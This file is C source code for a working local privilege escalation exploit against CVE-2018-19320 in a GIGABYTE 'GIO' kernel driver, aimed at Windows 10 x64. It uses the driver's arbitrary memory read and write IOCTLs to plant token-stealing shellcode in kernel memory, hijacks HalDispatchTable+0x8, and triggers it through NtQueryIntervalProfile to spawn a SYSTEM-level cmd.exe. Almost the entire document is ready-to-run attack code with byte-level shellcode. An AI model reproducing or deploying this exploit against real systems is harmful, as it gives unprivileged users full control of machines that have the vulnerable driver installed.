// Date: 2021-08-18
// CVE-2018-19320 LPE exploit
// Author: @hmsec
// Discovered by: Diego Juarez
// Tested on: Windows 10 x64 21H1(OS Build 1903.1165)

#include <windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <string.h>

typedef NTSTATUS(NTAPI* _NtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval);

_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");

typedef struct _gio_memcpy_struct {
	LPVOID dest;
	LPVOID src;
	DWORD size;
} gio_memcpy_struct;


HANDLE hDriver;
HANDLE open_driver() {
	hDriver = CreateFileA("\\\\.\\GIO", 0xC0000000, 0, NULL, 0x3, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open a handle to target driver.");
		exit(0);
		return FALSE;
	}
	return hDriver;
}

BOOL gio_memcpy(LPVOID dest, LPVOID src, DWORD size)
{
	gio_memcpy_struct arg_struct = { dest, src, size };

	BYTE out_buffer[0x30] = { 0 };
	DWORD returned = 0;

	DeviceIoControl(hDriver, 0xC3502808, (LPVOID)&arg_struct, sizeof(arg_struct), (LPVOID)out_buffer, sizeof(out_buffer), &returned, NULL);
	if (returned) {
		return TRUE;
	}
	return FALSE;
}


ULONG64 gio_memory_allocate(UINT64 buffer_len) {

	ULONG64 out_buffer[2] = { 0 };

	DeviceIoControl(hDriver, 0xC3502800, (LPVOID)&buffer_len, sizeof(buffer_len), (LPVOID)out_buffer, sizeof(out_buffer), NULL, NULL);
	return out_buffer[0];
}


LPVOID get_kernel_base_address()
{
	LPVOID image_base_addresses_array[1024];
	DWORD lpcbNeeded;

	BOOL base_eunm = EnumDeviceDrivers(image_base_addresses_array, sizeof(image_base_addresses_array), &lpcbNeeded);

	if (base_eunm == 0)
	{
		printf("[-] EnumDeviceDrivers Failed %d\n", GetLastError());
		exit(1);
	}

	// the kernel base address is the first address in the returned array.
	LPVOID kerne_base_address = image_base_addresses_array[0];
	return kerne_base_address;
}


// --- Token stealing Shellcode (Windows 10 x64 21H1) --- 
/*
	offsets:
	0x188     --> KPCR.Prcb.CurrentThread(_ETHREAD)
	0xB8      --> ETHREAD.Tcb.ApcState.Process(_EPROCSS)
	0x448     --> EPROCESS.ActiveProcessLink
	0x440     --> EPROCESS.pid
	0x4b8     --> EPROCESS.Token
*/

char shellcode[] =
"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"      // mov rax,gs:[0x188]     --> Get the current _ETHREAD
"\x48\x8b\x80\xb8\x00\x00\x00"				// mov rax, [rax+0xB8]    --> Get the _EPROCESS of the current process
"\x48\x89\xc1"								// mov rcx, rax           --> Backup the EPROCESS of the current process to rcx

"\x48\x8b\x80\x48\x04\x00\x00"				// mov rax,[rax+0x448]    --> Get `_EPROCESS.ActiveProcessLink` to iterate over the `_EPROCESS` struct of the running process
"\x48\x2d\x48\x04\x00\x00"					// sub rax, 448h          --> Go back to to the top of `_EPROCESS` (_EPROCESS+0x00)
"\x4c\x8b\x88\x40\x04\x00\x00"				// mov r9,[rax+0x440]     --> Get `EPROCESS.pid` 
"\x49\x83\xf9\x04"							// cmp r9, 4              --> compare if the pid equall 4 (system.exe pid)

"\x75\xe6"									// jne 0x18               --> if not, jump back the first instrcuction of loop (Until system.exe pid is found)

"\x48\x8b\x90\xb8\x04\x00\x00"				// mov rdx,[rax+0x4B8]    --> Move "System.exe" token to `rdx`
"\x48\x89\x91\xb8\x04\x00\x00"				// mov [rcx+0x4B8], rdx   --> Move "System.exe" token to current process's token
"\xc3";										// ret

char* shellcode_raw = shellcode;


int main(void)
{
	// open driver
	hDriver = open_driver();
	printf("[+] CVE-2018-19320 LPE exploit by @hmsec\n");

	// --- 1. Get kernel base address ---
	LPVOID kerne_base_address = get_kernel_base_address();
	printf("[+] Kernel base address: 0x%llx\n", kerne_base_address);

	// --- 2. Write the shellcode to the memory ---

	// Allocate the memory first
	printf("[+] Writing the shellcode to the memory\n");
	ULONG64 shellcode_address = gio_memory_allocate(sizeof(shellcode));
	printf("[+] shellcode address: 0x%llx\n", shellcode_address);

	// Write the shellcode raw data to `shellcode_address`
	gio_memcpy((LPVOID)shellcode_address, LPVOID(shellcode_raw), sizeof(shellcode));

	// --- 3. Get HalDispatchTable+0x8 adddress --- 

	char kernel_base_name[] = "ntoskrnl.exe";
	// Get `HalDispatchTable` in user mode
	HMODULE ntkrnll_handle = LoadLibraryA(kernel_base_name);
	LPVOID HalDispatchTable_user_address = (LPVOID)GetProcAddress(ntkrnll_handle, "HalDispatchTable");
	// printf("HalDispatchTable_user_address: 0x%llx\n", HalDispatchTable_user_address);

	// Note: `ntkrnl!HalDispatchTable` offset is the same both in user and kernel spaces
	LPVOID HalDispatchTable_offset = (LPVOID)((ULONG64)HalDispatchTable_user_address - (ULONG64)ntkrnll_handle);
	// printf("HalDispatchTable_offset: 0x%llx\n", HalDispatchTable_offset);

	LPVOID HalDispatchTable_kernel_address = (LPVOID)((ULONG64)HalDispatchTable_offset + (ULONG64)kerne_base_address);

	LPVOID HalDispatchTable_8 = (LPVOID)((ULONG64)HalDispatchTable_kernel_address + 8);
	printf("[+] HalDispatchTable+0x8 address: 0x%llx\n", HalDispatchTable_8);


	// --- 4. Overwrite HalDispatchTable+0x8 with shellcode address ---

	// Get the original HalDispatchTable + 0x8 first so we can restore it later
	PULONG64 HalDispatchTable_8_original_value;
	gio_memcpy(&HalDispatchTable_8_original_value, HalDispatchTable_8, 8);
	printf("[+] HalDispatchTable+0x8 original value: 0x%llx\n", HalDispatchTable_8_original_value);


	// Overwrite the shellcode_address to HalDispatchTable+0x8
	printf("[+] Overwriting HalDispatchTable+0x8 with shellcode address\n");
	gio_memcpy(HalDispatchTable_8, LPVOID(&shellcode_address), 8);

	// --- 5. Call NtQueryIntervalProfile to execute the shellcode (stored in HalDispatchTable+0x8)  ---
	printf("[+] Calling NtQueryIntervalProfile to execute the shellcode\n");
	ULONG temp;
	NtQueryIntervalProfile(0x10, &temp);

	// --- 6. Restore the original pointer of "HalDispatchTable+0x8" to avoid BSOD --
	printf("[+] Restoring the original value of HalDispatchTable+0x8 to avoid BSOD\n");
	gio_memcpy(HalDispatchTable_8, LPVOID(&HalDispatchTable_8_original_value), 8);

	printf("[+] Lauching cmd.exe \n");
	system("start cmd.exe");

	// Cleanup 
	CloseHandle(hDriver);

	return 0;
}
